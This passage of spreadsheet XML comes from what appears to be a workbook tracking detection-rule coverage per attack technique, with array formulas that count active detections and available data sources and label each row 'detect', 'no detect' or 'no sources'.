        <f t="array" ref="I226">IF(SUM(IF($C226=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C226=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J226" s="9" t="str" cm="1">
        <f t="array" ref="J22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26" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M226" s="9" cm="1">
        <f t="array" ref="M226">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N226" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O226" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P226" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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26" t="s">
        <v>1023</v>
      </c>
      <c r="U226" t="s">
        <v>1258</v>
      </c>
      <c r="V226" t="s">
        <v>1259</v>
      </c>
      <c r="W226" t="b">
        <v>1</v>
      </c>
      <c r="X226" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="227" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A227" t="s">
        <v>1243</v>
      </c>
      <c r="B227" t="s">
        <v>1260</v>
      </c>
      <c r="C227" t="s">
        <v>281</v>
      </c>
      <c r="D227" t="s">
        <v>4</v>
      </c>
      <c r="E227" t="s">
        <v>1257</v>
      </c>
      <c r="F227" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G227" s="9" cm="1">
        <f t="array" ref="G227">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H227" s="9" t="str" cm="1">
        <f t="array" ref="H227">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I227" s="9" t="str" cm="1">
        <f t="array" ref="I227">IF(SUM(IF($C227=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C227=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J227" s="9" t="str" cm="1">
        <f t="array" ref="J22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27" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M227" s="9" cm="1">
        <f t="array" ref="M227">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N227" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O227" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P227" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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27" t="s">
        <v>1023</v>
      </c>
      <c r="U227" t="s">
        <v>1261</v>
      </c>
      <c r="V227" t="s">
        <v>1259</v>
      </c>
      <c r="W227" t="b">
        <v>1</v>
      </c>
      <c r="X227" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="228" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A228" t="s">
        <v>1243</v>
      </c>
      <c r="B228" t="s">
        <v>1262</v>
      </c>
      <c r="C228" t="s">
        <v>276</v>
      </c>
      <c r="D228" t="s">
        <v>4</v>
      </c>
      <c r="E228" t="s">
        <v>1257</v>
      </c>
      <c r="F228" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G228" s="9" cm="1">
        <f t="array" ref="G228">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H228" s="9" t="str" cm="1">
        <f t="array" ref="H228">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I228" s="9" t="str" cm="1">
        <f t="array" ref="I228">IF(SUM(IF($C228=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C228=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J228" s="9" t="str" cm="1">
        <f t="array" ref="J22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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M228" s="9" cm="1">
        <f t="array" ref="M228">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N228" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O228" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P228" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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28" t="s">
        <v>1023</v>
      </c>
      <c r="U228" t="s">
        <v>1263</v>
      </c>
      <c r="V228" t="s">
        <v>1264</v>
      </c>
      <c r="W228" t="b">
        <v>1</v>
      </c>
      <c r="X228" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="229" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A229" t="s">
        <v>1243</v>
      </c>
      <c r="B229" t="s">
        <v>1265</v>
      </c>
      <c r="C229" t="s">
        <v>1266</v>
      </c>
      <c r="D229" t="s">
        <v>4</v>
      </c>
      <c r="E229" t="s">
        <v>1248</v>
      </c>
      <c r="F229" s="9">
        <f t="shared" si="3"/>
        <v>6</v>
      </c>
      <c r="G229" s="9" cm="1">
        <f t="array" ref="G229">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H229" s="9" t="str" cm="1">
        <f t="array" ref="H229">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I229" s="9" t="str" cm="1">
        <f t="array" ref="I229">IF(SUM(IF($C229=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C229=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J229" s="9" t="str" cm="1">
        <f t="array" ref="J22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29" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M229" s="9" cm="1">
        <f t="array" ref="M229">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N229" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O229" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P229" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S22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29" t="s">
        <v>1023</v>
      </c>
      <c r="U229" t="s">
        <v>1267</v>
      </c>
      <c r="V229" t="s">
        <v>1268</v>
      </c>
      <c r="W229" t="b">
        <v>1</v>
      </c>
      <c r="X229" t="s">
        <v>1243</v>
      </c>
    </row>
    <row r="230" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A230" t="s">
        <v>1269</v>
      </c>
      <c r="B230" t="s">
        <v>1269</v>
      </c>
      <c r="C230" t="s">
        <v>82</v>
      </c>
      <c r="D230" t="s">
        <v>6</v>
      </c>
      <c r="E230" t="s">
        <v>1270</v>
      </c>
      <c r="F230" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G230" s="9" cm="1">
        <f t="array" ref="G230">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H230" s="9" cm="1">
        <f t="array" ref="H230">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I230" s="9" t="str" cm="1">
        <f t="array" ref="I230">IF(SUM(IF($C230=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C230=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J230" s="9" t="str" cm="1">
        <f t="array" ref="J23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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M230" s="9" cm="1">
        <f t="array" ref="M230">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N230" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O230" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P230" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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30" t="s">
        <v>368</v>
      </c>
      <c r="U230" t="s">
        <v>1271</v>
      </c>
      <c r="V230" t="s">
        <v>1272</v>
      </c>
      <c r="W230" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="231" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A231" t="s">
        <v>1273</v>
      </c>
      <c r="B231" t="s">
        <v>1273</v>
      </c>
      <c r="C231" t="s">
        <v>67</v>
      </c>
      <c r="D231" t="s">
        <v>4</v>
      </c>
      <c r="E231" t="s">
        <v>1274</v>
      </c>
      <c r="F231" s="9">
        <f t="shared" si="3"/>
        <v>5</v>
      </c>
      <c r="G231" s="9" cm="1">
        <f t="array" ref="G231">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H231" s="9" cm="1">
        <f t="array" ref="H231">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I231" s="9" t="str" cm="1">
        <f t="array" ref="I231">IF(SUM(IF($C231=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C231=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J231" s="9" t="str" cm="1">
        <f t="array" ref="J23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31" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M231" s="9" cm="1">
        <f t="array" ref="M231">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N231" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O231" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P231" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S23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31" t="s">
        <v>368</v>
      </c>
      <c r="U231" t="s">
        <v>1275</v>
      </c>
      <c r="V231" t="s">
        <v>1276</v>
      </c>
      <c r="W231" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="232" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A232" t="s">
        <v>1277</v>
      </c>
      <c r="B232" t="s">
        <v>1277</v>
      </c>
      <c r="C232" t="s">
        <v>72</v>
      </c>
      <c r="D232" t="s">
        <v>10</v>
      </c>
      <c r="E232" t="s">
        <v>1278</v>
      </c>
      <c r="F232" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G232" s="9" cm="1">
        <f t="array" ref="G232">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H232" s="9" cm="1">
        <f t="array" ref="H232">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I232" s="9" t="str" cm="1">
        <f t="array" ref="I232">IF(SUM(IF($C232=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C232=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J232" s="9" t="str" cm="1">
        <f t="array" ref="J23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32" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M232" s="9" cm="1">
        <f t="array" ref="M232">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N232" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O232" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P232" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S23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32" t="s">
        <v>386</v>
      </c>
      <c r="U232" t="s">
        <v>1279</v>
      </c>
      <c r="V232" t="s">
        <v>1280</v>
      </c>
      <c r="W232" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="233" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A233" t="s">
        <v>1281</v>
      </c>
      <c r="B233" t="s">
        <v>1281</v>
      </c>
      <c r="C233" t="s">
        <v>69</v>
      </c>
      <c r="D233" t="s">
        <v>7</v>
      </c>
      <c r="E233" t="s">
        <v>1282</v>
      </c>
      <c r="F233" s="9">
        <f t="shared" si="3"/>
        <v>5</v>
      </c>
      <c r="G233" s="9" cm="1">
        <f t="array" ref="G233">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H233" s="9" cm="1">
        <f t="array" ref="H233">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I233" s="9" t="str" cm="1">
        <f t="array" ref="I233">IF(SUM(IF($C233=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C233=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J233" s="9" t="str" cm="1">
        <f t="array" ref="J23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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M233" s="9" cm="1">
        <f t="array" ref="M233">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N233" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O233" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P233" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S23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33" t="s">
        <v>386</v>
      </c>
      <c r="U233" t="s">
        <v>1283</v>
      </c>
      <c r="V233" t="s">
        <v>1284</v>
      </c>
      <c r="W233" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="234" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A234" t="s">
        <v>1285</v>
      </c>
      <c r="B234" t="s">
        <v>1285</v>
      </c>
      <c r="C234" t="s">
        <v>28</v>
      </c>
      <c r="D234" t="s">
        <v>2</v>
      </c>
      <c r="E234" t="s">
        <v>1286</v>
      </c>
      <c r="F234" s="9">
        <f t="shared" si="3"/>
        <v>5</v>
      </c>
      <c r="G234" s="9" cm="1">
        <f t="array" ref="G234">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H234" s="9" cm="1">
        <f t="array" ref="H234">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I234" s="9" t="str" cm="1">
        <f t="array" ref="I234">IF(SUM(IF($C234=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C234=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J234" s="9" t="str" cm="1">
        <f t="array" ref="J23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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M234" s="9" cm="1">
        <f t="array" ref="M234">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N234" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O234" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P234" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S23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34" t="s">
        <v>1287</v>
      </c>
      <c r="U234" t="s">
        <v>1288</v>
      </c>
      <c r="V234" t="s">
        <v>1289</v>
      </c>
      <c r="W234" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="235" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A235" t="s">
        <v>1290</v>
      </c>
      <c r="B235" t="s">
        <v>1290</v>
      </c>
      <c r="C235" t="s">
        <v>41</v>
      </c>
      <c r="D235" t="s">
        <v>2</v>
      </c>
      <c r="E235" t="s">
        <v>1291</v>
      </c>
      <c r="F235" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G235" s="9" cm="1">
        <f t="array" ref="G235">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H235" s="9" cm="1">
        <f t="array" ref="H235">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I235" s="9" t="str" cm="1">
        <f t="array" ref="I235">IF(SUM(IF($C235=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C235=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J235" s="9" t="str" cm="1">
        <f t="array" ref="J23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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M235" s="9" cm="1">
        <f t="array" ref="M235">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N235" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O235" s="14">
